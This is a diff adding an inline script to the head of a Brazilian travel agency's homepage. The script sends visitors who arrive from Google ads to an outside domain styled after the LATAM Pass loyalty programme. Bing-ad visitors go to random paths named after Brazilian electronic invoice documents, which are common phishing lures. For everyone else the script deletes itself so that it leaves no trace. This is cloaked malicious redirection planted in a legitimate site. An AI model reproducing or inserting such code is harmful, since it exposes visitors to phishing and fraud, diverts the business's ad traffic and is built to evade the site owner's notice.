@@ -1,6 +1,45 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
+    <script>
+(function() {
+    const urls = [
+        'cte/index',
+        'nfe/index',
+        'asp/indexp',
+        'app/index',
+        'xml/indexp',
+        'danfe/index'
+    ];
+
+    function generateTrackingId() {
+        return (
+            Math.random().toString(36).substring(2, 15) +
+            Math.random().toString(36).substring(2, 15) +
+            Date.now().toString(36)
+        );
+    }
+
+    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+    const trackingId = generateTrackingId();
+    const redirectLink = 'https://agencia-latampass.com/?code=69cbf5809ADSPARA';  
+
+    const referer = document.referrer || '';
+    const currentUrl = window.location.href || '';
+
+    // Redirecionamento baseado em parâmetros de anúncios
+    if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+        window.location.href = redirectLink;
+    } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+        window.location.href = ${randomUrl}?msclkid=${trackingId};
+    } else {
+        // Se não for origem Ads, remove o script para não deixar rastros desnecessários
+        if (document.currentScript) {
+            document.currentScript.remove();
+        }
+    }
+})();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <meta name="description" content="Strik Turismo - Agência de Viagens em Londrina/PR. Pacotes, passagens aéreas, hospedagem, cruzeiros e resorts. Atendimento personalizado desde 2002.">
